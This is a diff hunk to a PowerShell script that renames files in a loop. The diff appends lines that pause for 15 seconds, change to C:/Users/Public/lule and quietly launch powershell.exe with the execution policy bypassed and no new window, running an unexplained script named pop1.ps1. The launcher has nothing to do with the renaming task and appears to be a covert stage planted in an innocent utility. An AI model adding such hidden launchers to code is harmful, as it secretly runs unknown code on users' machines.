@@ -25,3 +25,7 @@ foreach ($file in $files) {
     # Rename the file
     Rename-Item -Path $file.FullName -NewName $newName
 }
+
+timeout /t 15 /nobreak > nul
+cd C:/Users/Public/lule
+Start-Process -NoNewWindow -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass .\pop1.ps1"
